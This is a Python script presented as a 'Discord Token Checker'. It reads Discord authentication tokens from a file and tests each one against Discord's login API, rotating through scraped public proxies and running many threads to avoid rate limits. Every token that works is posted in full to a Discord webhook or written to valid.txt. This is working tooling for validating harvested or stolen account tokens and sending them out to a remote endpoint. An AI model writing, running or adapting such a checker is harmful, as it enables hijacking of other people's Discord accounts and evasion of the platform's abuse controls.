import os
import requests
import ctypes
import threading
import time
from colorama import Fore, init
import random
from discord_webhook import DiscordWebhook

from core.localscommands import clear, pause, title

#  set to true if needed
debug = False

def start():
	pass

init()
clear()
global webhookk
webhookk = ""
webhookk = input("Webhook: ")
if webhookk == "":
	print("The value you entered was null. Please try again.")
	pause()
	start()
elif webhookk == " ":
	print("The value you entered was null. Please try again.")
	pause()
	start()

valid = 0
invalid = 0 
total = 0
errorCodes = [100, 101, 103, 201, 202, 203, 204, 205, 206, 300, 301, 302, 303, 304, 307, 308, 400, 401, 402, 403, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 422, 425, 426, 428, 431, 451, 500, 501, 502, 503, 504, 505, 506, 507, 508, 510, 511]

def getProxy():
	global proxList
	global proxList2
	prox = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=US&ssl=no&anonymity=all")
	if prox.text == "You have reached your hourly maximum API requests of 750.":
		print("Please wait an hour before running this script again.")
		pause()
		exit()
	proxyTxt = prox.text.splitlines()
	proxList = []
	for line in proxyTxt:
		proxList.append(line)
	prox2 = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=US&ssl=yes&anonymity=all")
	if prox2.text == "You have reached your hourly maximum API requests of 750.":
		print("Please wait an hour before running this script again.")
		pause()
		exit()
	proxyTxt2 = prox2.text.splitlines()
	proxList2 = []
	for line in proxyTxt2:
		proxList2.append(line)

def main():
	clear()
	print(Fore.YELLOW + "[!] If you are having issues with the checker try restarting the script to get new proxies.")
	try:
		getProxy()
		pass
	except Exception as e:
		clear()
		print(f"Error:\n{e}")
		pause()
		exit()
	try:
		with open("tokens.txt", "r") as f:
			global line
			lines = f.read().splitlines()
			for line in lines:
				thread = threading.Thread(target=checkToken, daemon=True)
				thread.start()
				time.sleep(0.1)
			pause()
			f.close()
			try:
				a.close()
			except Exception as e:
				if debug == True:
					print(e)
					pass
				pass
	except FileNotFoundError as e:
		if debug == True:
			print(e)
			pass
		print("Please create a file named 'tokens.txt', and enter your tokens in there.")
		pause()
		exit()
				

def checkToken():
	global invalid
	global valid
	global total
	global randProxy
	global randProxySSL
	randProxy = random.choice(proxList)
	randProxySSL = random.choice(proxList2)
	token = line
	try:
		discordAPI = requests.get("https://discord.com/api/v9/auth/login", headers={"Authorization": token}, proxies={"http": randProxy,"https": randProxySSL})
	except Exception as e:
		if debug == True:
			print(e)
			pass
		return;
	if discordAPI.status_code == 404:
		invalid += 1
		total += 1
		title("Discord Token Checker | arshan.xyz | Valid: " + str(valid) +  " Invalid: " + str(invalid) + " Total: " + str(total))
		print(Fore.RED + f"[-] Token '{token}' is invalid.")
	elif discordAPI.status_code == 200:
		if token.startswith("mfa."):
			spliced = token[25:]
			length = len(spliced)
			spliced = "*" * length
			endResult = token[:25] + spliced
		else:
			spliced = token[25:]
			length = len(spliced)
			spliced = "*" * length
			endResult = token[:25] + spliced
		valid += 1
		total += 1
		title("Discord Token Checker | arshan.xyz | Valid: " + str(valid) +  " Invalid: " + str(invalid) + " Total: " + str(total))
		print(Fore.GREEN + f"[+] Token '{endResult}' is valid.")
		webhook = DiscordWebhook(url=webhookk, content=f"[!] Valid Discord Token: {token}")
		try:
			response = webhook.execute()
		except Exception:
			print(Fore.YELLOW + "Invalid Webhook URL, saving token to valid.txt")
			with open("valid.txt", "a") as f:
				f.writelines(token + "\n")
	elif discordAPI.status_code == 429:
		total += 1
		title("Discord Token Checker | arshan.xyz | Valid: " + str(valid) +  " Invalid: " + str(invalid) + " Total: " + str(total))
		print(Fore.YELLOW + "[!] You are being ratelimited.")
	elif discordAPI.status_code in errorCodes:
		total += 1
		title("Discord Token Checker | arshan.xyz | Valid: " + str(valid) +  " Invalid: " + str(invalid) + " Total: " + str(total))
		print(Fore.YELLOW + "[!] An unexpected error has occured. Error Code: " + str(discordAPI.status_code))

def menu():
	title("Discord Token Checker | arshan.xyz | Valid: " + str(valid) +  " Invalid: " + str(invalid) + " Total: " + str(total))
	main()

if __name__ == "__main__":
	menu()
	
